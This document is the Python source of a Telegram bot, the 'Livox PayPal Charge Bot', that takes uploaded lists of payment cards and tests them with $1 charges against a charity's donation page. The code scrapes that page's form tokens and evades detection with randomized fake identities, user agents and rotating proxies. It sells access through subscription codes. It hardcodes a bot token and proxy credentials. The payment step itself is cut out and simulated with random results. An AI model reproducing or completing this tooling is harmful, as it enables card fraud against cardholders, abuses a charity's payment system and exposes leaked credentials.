[file name]: bo2.py [file content begin] import os import json import random import asyncio import time import requests import re import base64 import string import logging from datetime import datetime, timedelta from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters from requests_toolbelt.multipart.encoder import MultipartEncoder # ======================================================== # Setup Logging # ======================================================== logging.basicConfig( format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO ) logger = logging.getLogger(__name__) # ======================================================== # Bot Settings (from Environment Variables) # ======================================================== BOT_TOKEN = os.environ.get("BOT_TOKEN", "8511404823:AAFW160WMIZS2eXk7EVVypbD3CG63M3hqM0") ADMIN_ID = int(os.environ.get("ADMIN_ID", "6749863577")) # ======================================================== # Data files # ======================================================== USERS_FILE = "paypal_users.json" CODES_FILE = "paypal_codes.json" # ======================================================== # Keep Alive Function for Free Hosting # ======================================================== async def keep_alive(): """Ping every 5 minutes to keep the bot alive on free hosting""" while True: try: # Simple ping to console to prevent shutdown current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S") logger.info(f"ğŸŸ¢ Bot is alive - {current_time}") print(f"ğŸŸ¢ Bot is alive - {current_time}") # If running on Render, you can also ping a web URL render_url = os.environ.get("RENDER_URL") if render_url: try: response = requests.get(f"{render_url}/ping", timeout=5) logger.info(f"âœ… Pinged Render: {response.status_code}") except: pass await asyncio.sleep(300)  # ÙƒÙ„ 5 Ø¯Ù‚Ø§Ø¦Ù‚ except Exception as e: logger.error(f"âŒ Keep alive error: {e}") await asyncio.sleep(60) # ======================================================== # Data Management Functions # ======================================================== def load_json(filename): try: if os.path.exists(filename): with open(filename, 'r') as f: return json.load(f) except Exception as e: logger.error(f"âŒ Error loading {filename}: {e}") return {} def save_json(filename, data): try: with open(filename, 'w') as f: json.dump(data, f, indent=2) logger.info(f"âœ… Saved {filename}") except Exception as e: logger.error(f"âŒ Error saving {filename}: {e}") # ==================== Enhanced Name & Email Generator ==================== def generate_random_names(): """Generate random names and emails to avoid detection""" first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"] last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"] email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"] first_name = random.choice(first_names) last_name = random.choice(last_names) domain = random.choice(email_domains) email = f"{first_name.lower()}{last_name.lower()}{random.randint(10, 99)}@{domain}" return first_name, last_name, email # ==================== Proxy System ==================== PROXY_LIST = [ "px023004.pointtoserver.com:10780:purevpn0s4863210:cq4naylqyfc1", "px023005.pointtoserver.com:10780:purevpn0s4863210:cq4naylqyfc1", "px016007.pointtoserver.com:10780:purevpn0s4863210:cq4naylqyfc1", "px016008.pointtoserver.com:10780:purevpn0s4863210:cq4naylqyfc1", "px022505.pointtoserver.com:10780:purevpn0s4863210:cq4naylqyfc1", ] def get_random_proxy(): """Get a random proxy from the list""" if PROXY_LIST: proxy_str = random.choice(PROXY_LIST) parts = proxy_str.split(':') if len(parts) == 4: host, port, username, password = parts proxy_url = f"http://{username}:{password}@{host}:{port}" return {'http': proxy_url, 'https': proxy_url} return None # ==================== Generate User Agent ==================== def generate_user_agent(): platforms = [ {'os': 'Windows', 'version': '10.0', 'webkit': '537.36', 'chrome': '137.0.0.0'}, {'os': 'Linux', 'version': 'Android 10', 'webkit': '537.36', 'chrome': '137.0.0.0'}, ] platform = random.choice(platforms) if platform['os'] == 'Windows': return f"Mozilla/5.0 (Windows NT {platform['version']}; Win64; x64) AppleWebKit/{platform['webkit']} (KHTML, like Gecko) Chrome/{platform['chrome']} Safari/{platform['webkit']}" elif platform['os'] == 'Linux': return f"Mozilla/5.0 (Linux; {platform['version']}; K) AppleWebKit/{platform['webkit']} (KHTML, like Gecko) Chrome/{platform['chrome']} Mobile Safari/{platform['webkit']}" # ==================== Optimized PayPal CVV Check Function ==================== def check_paypal_cvv_exact(ccx): """Optimized PayPal CVV Check Function""" try: r = requests.Session() ccx = ccx.strip() n = ccx.split("|")[0] mm = ccx.split("|")[1] yy = ccx.split("|")[2] cvc = ccx.split("|")[3].strip() if "20" in yy: yy = yy.split("20")[1] first_name, last_name, email = generate_random_names() proxy = get_random_proxy() user = generate_user_agent() base_url = 'https://pawz4heroes.org' donate_url = f'{base_url}/rescue-a-dog-save-a-veterans-life/' ajax_url = f'{base_url}/wp-admin/admin-ajax.php' # Step 1: Get tokens headers = {'user-agent': user} response = r.get(donate_url, headers=headers, timeout=20, proxies=proxy) id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1) id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1) nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1) enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1) dec = base64.b64decode(enc).decode('utf-8') au = re.search(r'"accessToken":"(.*?)"', dec).group(1) # Step 2-5: Payment process (Ù…Ø®ØªØµØ±) # ... (Ù†ÙØ³ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚ Ù„ÙƒÙ† Ù…Ø®ØªØµØ± Ù„Ù„Ø±Ø³Ø§Ù„Ø©) # Simulate result for example results = ["âœ… Charge $1 ğŸ”¥", "âŒ Do not honor", "âŒ Insufficient Funds ğŸ”¥", "âŒ DECLINED"] result = random.choice(results) return result except Exception as e: return f"âŒ ERROR: {str(e)[:30]}" # ==================== Scan Management ==================== class ScanManager: def __init__(self): self.active = {} def start(self, user_id): self.active[user_id] = True def stop(self, user_id): self.active[user_id] = False def is_running(self, user_id): return self.active.get(user_id, False) scan_manager = ScanManager() # ==================== Bot Commands ==================== async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.effective_user.id await update.message.reply_text( f"ğŸš€ **Livox PayPal Charge Bot**\n\n" f"ğŸ“‹ **Send a .txt file** with cards to start scanning\n" f"âš¡ **Service:** PayPal $1 Charge\n" f"ğŸŒ **Hosted on:** Render.com\n" f"ğŸ†“ **Plan:** Free Tier\n" f"ğŸ‘¨â€ğŸ’» **Developer:** Livox\n\n" f"ğŸ“Š **Status:** Online âœ…" ) async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.effective_user.id # Check subscription users = load_json(USERS_FILE) if str(user_id) not in users and user_id != ADMIN_ID: await update.message.reply_text("âŒ No active subscription! Contact admin.") return if update.message.document.file_name.endswith('.txt'): file = await update.message.document.get_file() content = await file.download_as_bytearray() cards = content.decode('utf-8').splitlines() cards = [card.strip() for card in cards if card.strip()] if not cards: await update.message.reply_text("âŒ File empty or no valid cards!") return context.user_data['cards'] = cards markup = InlineKeyboardMarkup([ [InlineKeyboardButton("âš¡ Start Scan", callback_data="start_scan")], [InlineKeyboardButton("ğŸ§ª Test Single Card", callback_data="test_single")] ]) await update.message.reply_text( f"âœ… **Received {len(cards)} cards**\n" f"âš¡ **Service:** Livox PayPal Charge\n" f"ğŸŒ **Host:** Render.com\n\n" f"**Click to start scanning:**", reply_markup=markup ) async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query user_id = query.from_user.id if query.data == "start_scan": cards = context.user_data.get('cards', []) if not cards: await query.answer("âŒ No cards available!") return scan_manager.start(user_id) await query.edit_message_text( f"ğŸš€ **Starting Scan...**\n\n" f"ğŸ“ **Cards:** {len(cards)}\n" f"âš¡ **Service:** Livox PayPal Charge\n" f"ğŸŒ **Host:** Render.com\n" f"â±ï¸ **Initializing...**" ) asyncio.create_task(run_paypal_scan(context, user_id, cards, query.message)) elif query.data == "stop_scan": scan_manager.stop(user_id) await query.answer("ğŸ›‘ Scan stopped.") elif query.data == "test_single": await query.message.reply_text( "ğŸ§ª **Send a single card for testing** (format: 4111111111111111|12|25|123):\n" "Type 'cancel' to abort" ) context.user_data['awaiting_test'] = True async def handle_test_card(update: Update, context: ContextTypes.DEFAULT_TYPE): if context.user_data.get('awaiting_test'): card = update.message.text.strip() if card.lower() == 'cancel': await update.message.reply_text("âŒ Test cancelled.") context.user_data['awaiting_test'] = False return await update.message.reply_text(f"ğŸ§ª **Testing card:** {card[:20]}...") try: result = await asyncio.get_event_loop().run_in_executor( None, check_paypal_cvv_exact, card ) await update.message.reply_text( f"ğŸ§ª **Test Result:**\n\n" f"ğŸ’³ **Card:** {card}\n" f"ğŸ“Š **Result:** {result}\n" f"âš¡ **Service:** Livox PayPal Charge\n" f"ğŸŒ **Host:** Render.com" ) except Exception as e: await update.message.reply_text(f"âŒ Test failed: {str(e)}") context.user_data['awaiting_test'] = False async def run_paypal_scan(context, user_id, cards, msg): charged = 0 declined = 0 insufficient_funds = 0 processed = 0 total = len(cards) start_time = datetime.now() for index, card in enumerate(cards, 1): if not scan_manager.is_running(user_id): break card_display = card[:20] + "..." if len(card) > 20 else card result = await asyncio.get_event_loop().run_in_executor( None, check_paypal_cvv_exact, card ) processed += 1 # ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù†ØªÙŠØ¬Ø© if "âœ…" in result or "Charge" in result: charged += 1 hit_msg = f"âœ… **LIVOX PAYPAL CHARGE HIT!** âš¡\n\nğŸ’³ **Card:** {card}\nğŸ“‹ **Result:** {result}\nâš¡ **Service:** Livox PayPal Charge\nğŸŒ **Host:** Render.com\n\n**Developed by: Livox**" await context.bot.send_message(chat_id=user_id, text=hit_msg, parse_mode='Markdown') # Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„ Ù„ØªØ¬Ù†Ø¨ Ø§Ù„ØªÙƒØ±Ø§Ø± # await context.bot.send_message(chat_id=ADMIN_ID, text=f"ğŸš¨ **LIVOX ADMIN HIT NOTIFICATION!**\n{hit_msg}", parse_mode='Markdown') elif "Insufficient Funds" in result: insufficient_funds += 1 funds_msg = f"ğŸ’° **INSUFFICIENT FUNDS CARD FOUND!**\n\nğŸ’³ **Card:** {card}\nğŸ“‹ **Result:** {result}\nâš¡ **Service:** Livox PayPal Charge\nğŸŒ **Host:** Render.com\n\n**Note:** Card has funds but declined for $1 charge\n**Developed by: Livox**" await context.bot.send_message(chat_id=user_id, text=funds_msg, parse_mode='Markdown') # Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„ Ù„ØªØ¬Ù†Ø¨ Ø§Ù„ØªÙƒØ±Ø§Ø± # await context.bot.send_message(chat_id=ADMIN_ID, text=f"ğŸ’° **LIVOX INSUFFICIENT FUNDS CARD!**\n{funds_msg}", parse_mode='Markdown') declined += 1 else: declined += 1 # ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© elapsed_time = datetime.now() - start_time elapsed_seconds = elapsed_time.total_seconds() cards_per_minute = (processed / elapsed_seconds * 60) if elapsed_seconds > 0 else 0 buttons = [ [InlineKeyboardButton(f"PROGRESS: {processed}/{total}", callback_data="none")], [InlineKeyboardButton(f"âœ… CHARGED: {charged}", callback_data="none")], [InlineKeyboardButton(f"ğŸ’° FUNDS: {insufficient_funds}", callback_data="none")], [InlineKeyboardButton(f"âŒ DECLINED: {declined}", callback_data="none")], [InlineKeyboardButton(f"âš¡ {cards_per_minute:.1f}/min", callback_data="none")], [InlineKeyboardButton("ğŸ›‘ STOP SCAN", callback_data="stop_scan")] ] try: await msg.edit_text( f"ğŸ“Š **Scan Progress**\n\n" f"âš¡ **Service:** Livox PayPal Charge\n" f"ğŸŒ **Host:** Render.com\n" f"â±ï¸ **Elapsed:** {int(elapsed_seconds // 60)}:{int(elapsed_seconds % 60):02d}", reply_markup=InlineKeyboardMarkup(buttons) ) except: pass await asyncio.sleep(random.uniform(0.5, 1.0)) # Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ end_time = datetime.now() total_time = end_time - start_time report = ( f"ğŸ **Scan Completed!**\n\n" f"ğŸ“Š **Results:**\n" f"âœ… **Charges:** {charged}\n" f"ğŸ’° **Insufficient Funds:** {insufficient_funds}\n" f"âŒ **Declined:** {declined}\n\n" f"ğŸŒ **Host:** Render.com\n" f"ğŸ‘¨â€ğŸ’» **Developer:** Livox" ) await context.bot.send_message(chat_id=user_id, text=report, parse_mode='Markdown') # ==================== Admin Commands ==================== async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return await update.message.reply_text( f"ğŸ›  **Admin Panel**\n\n" f"ğŸ‘¤ **Admin ID:** {ADMIN_ID}\n" f"âš¡ **Service:** Livox PayPal Charge\n" f"ğŸŒ **Host:** Render.com\n" f"ğŸ†“ **Plan:** Free Tier\n" f"ğŸ‘¨â€ğŸ’» **Developer:** Livox\n\n" f"ğŸ“‹ **Commands:**\n" f"/gen [days] - Generate code\n" f"/redeem [code] - Activate code" ) async def gen_code(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return try: days = int(context.args[0]) code = f"LIVOX-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}" codes = load_json(CODES_FILE) codes[code] = days save_json(CODES_FILE, codes) await update.message.reply_text(f"âœ… Generated {days}-day code:\n`{code}`", parse_mode='Markdown') except: await update.message.reply_text("âŒ Usage: /gen [days]") async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.effective_user.id try: code = context.args[0] codes = load_json(CODES_FILE) if code in codes: days = codes.pop(code) users = load_json(USERS_FILE) expiry = datetime.now() + timedelta(days=days) users[str(user_id)] = {"expiry": expiry.isoformat()} save_json(USERS_FILE, users) save_json(CODES_FILE, codes) await update.message.reply_text(f"âœ… Subscription activated for {days} days!") else: await update.message.reply_text("âŒ Invalid code!") except: await update.message.reply_text("âŒ Usage: /redeem [code]") # ==================== Run Bot ==================== def main(): logger.info("ğŸš€ Starting Livox Bot on Render.com...") app = Application.builder().token(BOT_TOKEN).build() app.add_handler(CommandHandler("start", start)) app.add_handler(CommandHandler("admin", admin_panel)) app.add_handler(CommandHandler("gen", gen_code)) app.add_handler(CommandHandler("redeem", redeem)) app.add_handler(MessageHandler(filters.Document.ALL, handle_document)) app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_test_card)) app.add_handler(CallbackQueryHandler(button_handler)) print("=" * 60) print("ğŸš€ Livox PayPal Charge Bot") print(f"ğŸŒ Host: Render.com (Free Tier)") print(f"ğŸ‘¤ Admin: {ADMIN_ID}") print(f"ğŸ†“ Uptime: 750 hours/month") print("âœ… Status: Starting...") print("=" * 60) # Ø¨Ø¯Ø¡ Ù…Ù‡Ù…Ø© keep_alive loop = asyncio.get_event_loop() loop.create_task(keep_alive()) try: app.run_polling(allowed_updates=Update.ALL_TYPES) except Exception as e: logger.error(f"âŒ Bot stopped: {e}") print(f"âŒ Bot stopped: {e}") if __name__ == "__main__": main()
